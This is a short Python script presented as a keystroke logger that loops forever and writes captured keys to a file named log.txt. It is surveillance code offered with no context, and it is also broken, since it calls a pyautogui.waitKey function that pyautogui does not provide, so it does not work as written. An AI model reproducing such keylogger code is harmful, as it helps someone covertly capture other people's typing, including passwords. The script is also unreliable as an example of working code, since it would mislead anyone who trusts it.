import pyautogui
import time
def main():
    # Start recording keystrokes
    with open("log.txt", "w") as f:
        while True:
            # Get the current keystroke
            key = pyautogui.waitKey()
            # Write the keystroke to the log file
            f.write(key)
            # Sleep for a short amount of time
            time.sleep(0.1)
if __name__ == "__main__":
    main()